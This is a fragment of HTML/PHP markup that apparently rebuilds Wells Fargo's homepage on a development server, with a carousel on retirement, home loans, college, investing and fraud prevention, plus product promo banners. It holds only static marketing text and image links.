<div class="nbaImg7"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Get the basics of retirement &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg8"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Plan for retirement income &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg9"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Manage money in retirement &gt;</span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button">Go to Retirement Planning</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 3</span></div>
          
         
              
            <div class="carouselFrame item4" role="tabpanel" data-ia-code="C_mtg_homelending_hpcarousel_web" data-order="null" data-cid="tcm:84-147015-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels4" aria-labelledby="nbaDefault4" tabindex="0" style="display: none;"><span class="hidden">Begin item 4</span>
    <div class="c63contentMain">
    
        
          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/man-moving-plant-shelf-970x485.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/man-moving-plant-shelf-970x485.jpg">
        
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Homeownership, simplified</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg10"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Buy a home &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg11"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Compare your loan options &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg12"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Refinance your mortgage &gt;</span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button">Go to Home Lending</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 4</span></div>
          
         
              
            <div class="carouselFrame item5" role="tabpanel" data-ia-code="C_efs_college_hpcarousel_web" data-order="null" data-cid="tcm:84-146942-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels5" aria-labelledby="nbaDefault5" tabindex="0" style="display: none;"><span class="hidden">Begin item 5</span>
    <div class="c63contentMain">
    
        
          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/college-students-group-steps-970x485.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/college-students-group-steps-970x485.jpg">
        
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Planning and paying for college</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg13"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Learn about financial aid &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg14"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Explore private student loans &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg15"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Manage your money while in school &gt;</span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button">Visit Going to College</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 5</span></div>
          
         
              
            <div class="carouselFrame item6" role="tabpanel" data-ia-code="C_wtr_investment_hpcarousel_web" data-order="null" data-cid="tcm:84-147005-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels6" aria-labelledby="nbaDefault6" tabindex="0" style="display: none;"><span class="hidden">Begin item 6</span>
    <div class="c63contentMain">
    
        
          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/couple-computer-table-970x485.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/couple-computer-table-970x485.jpg">
        
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Pursue your investing goals</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg16"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Understand investment types &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg17"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Compare ways to invest &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg18"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>To save or to invest? &gt;</span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button">Go to Investing Basics</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 6</span></div>
          
         
              
            <div class="carouselFrame item7" role="tabpanel" data-ia-code="C_oth_fraud_hpcarousel_web" data-order="null" data-cid="tcm:84-147034-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels7" aria-labelledby="nbaDefault7" tabindex="0" style="display: none;"><span class="hidden">Begin item 7</span>
    <div class="c63contentMain">
    
        
          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/man-sitting-phone-computer-970x485.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/man-sitting-phone-computer-970x485.jpg">
        
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Take action to help safeguard your accounts</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg22"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Report fraud and suspicious activity &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg23"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Change your username and password often &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg24"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Recognize common scams &gt;</span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button">Learn More About Fraud Prevention</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 7</span></div>
          
         
    </div>
</div>




   
    
<div class="largePromo fadeInElement" data-cid="tcm:242-147041-16" data-ctid="tcm:224-146926-32" style="opacity: 1;">	
    
	<div class="iaRendered" data-slot-id="WF_CON_HP_PROD_SVC_BNR" lang="en" data-offer-id="C_chk_checkingeverydaybanking_productservices_web"><div class="inner" data-cid="tcm:402-149413-16" data-ctid="tcm:91-146914-32">
    
      <div class="col1">
            
                <a class="i7" tabindex="-1" aria-hidden="true" data-tracking-id="21520-158539-3408-84">
                     <img alt="Get Started: http://dev.hawkscode.com.au/adam-and-company/new/jump/checking/minutes-checking/" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfia081_ph_b7007_00117_489x234.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfia081_ph_b7007_00117_489x234.jpg">
                </a>
            
           
      </div>
    
    <div class="col2">
        <h3>Everyday Checking</h3>
        <span>Open a new checking account online in minutes</span>

    </div>
</div></div></div>

 <div class="recommendedTitleWrapper fadeInElement" data-cid="tcm:182-147037-16" data-ctid="tcm:223-146919-32" style="opacity: 1;">

  <h3 class="recommendedTitle">Suggested for you</h3> 

</div>

<div class="hpAdditional fadeInElement" data-cid="tcm:242-147042-16" data-ctid="tcm:224-146928-32" style="opacity: 1;">
         <div class="hpAdditionalMainCol">
                 
	               <div class="iaRendered" data-slot-id="WF_CON_HP_SECONDARY_BNR_1" lang="en" data-offer-id="C_sav_savingfast_hpsec_web"><div class="hpAdditionalContentImg fadeMe" data-cid="tcm:402-149177-16" data-ctid="tcm:91-146900-32">
         <div class="wrapper" style="display: block;">
             
               
                 <a class="i7" data-tracking-id="21520-158536-3408-27">
           
                            <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfia432_ph_g132269213_304x194.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfia432_ph_g132269213_304x194.jpg">
                            <span class="hpAdditionalContentCol">                                
			    <span class="c5headline">Want to reach your goals faster?</span>
                            <span class="hpAdditionalContentText">Open a savings account and start making saving a permanent habit</span>
                            </span>
                 </a>
            </div>
</div></div><div class="iaRendered" data-slot-id="WF_CON_HP_SECONDARY_BNR_2" lang="en" data-offer-id="C_ent_lunarnewyear_hpsec_web"><div class="hpAdditionalContentImg fadeMe" data-cid="tcm:402-161954-16" data-ctid="tcm:91-146900-32">
         <div class="wrapper" style="display: block;">
             
                <a class="i7" data-tracking-id="21520-158525-3408-93">
             
               
                            <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfic371_ph_a-beagle_jul_final102p_304x194.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfic371_ph_a-beagle_jul_final102p_304x194.jpg">
                            <span class="hpAdditionalContentCol">                                
			    <span class="c5headline">Happy Year of the Dog</span>
                            <span class="hpAdditionalContentText">Embrace a New Year full of prosperity with Wells Fargo</span>
                            </span>
                 </a>
            </div>
</div></div><div class="cmsDefault" data-slot-id="WF_CON_HP_SECONDARY_BNR_3" lang="en">
            <div class="hpAdditionalContentImg fadeMe" data-cid="tcm:84-146971-16" data-ctid="tcm:91-146900-32">
         <div class="wrapper" style="display: block;">
             
               
                 <a class="i7">
           
                            
          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfi111_ph_hre_default3_304x194.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfi111_ph_hre_default3_304x194.jpg">
        
                            <span class="hpAdditionalContentCol">                                
			    <span class="c5headline">Questions about an old 401(k)?</span>
                            <span class="hpAdditionalContentText">Let’s talk about your options</span>
                            </span>
                 </a>
            </div>
</div>
          </div></div>         		
</div>



<!-- Bottom Region Starts-->
<div class="bottomRegion fadeInElement" style="opacity: 1;">
	
       
        <div class="inner">
<div class="col1">
<h2>Serving our customers and communities</h2>
<p>It doesn't happen with one transaction, in one day on the job or in one quarter. It's earned relationship by relationship.</p>
<ul id="communityLinks">
<li><a href="http://dev.hawkscode.com.au/adam-and-company/new/">Our Vision and Values &gt;</a></li>
<li><a href="http://dev.hawkscode.com.au/adam-and-company/new/">Who We Are &gt;</a></li>
<li><a href="http://dev.hawkscode.com.au/adam-and-company/new/">Corporate Social Responsibility &gt;</a></li>
<li><a href="http://dev.hawkscode.com.au/adam-and-company/new/">Wells Fargo Stories &gt;</a></li>
</ul>
</div>
<div class="box"><img alt="" class="deferred" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wellsfargo-volunteers-building-house-414x240.jpg" style="width: 100%;height:240px;" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wellsfargo-volunteers-building-house-414x240.jpg"><img alt="" class="deferred hide" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/stagecoach-two-drivers-field-green-414x240.jpg" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/stagecoach-two-drivers-field-green-414x240.jpg"><img alt="" class="deferred hide" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/man-woman-handshake-office-lobby-stagecoach-414x240.jpg" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/man-woman-handshake-office-lobby-stagecoach-414x240.jpg"><img alt="" class="deferred hide" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/three-men-volunteer-house-414x240.jpg" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/three-men-volunteer-house-414x240.jpg"><img alt="" class="deferred hide" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/woman-sitting-chair-tablet-screenshot-414x240.jpg" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/woman-sitting-chair-tablet-screenshot-414x240.jpg"></div>
</div>                        
</div>
<!-- Bottom Region Ends-->
        </div>
<?php include('footer.php'); ?>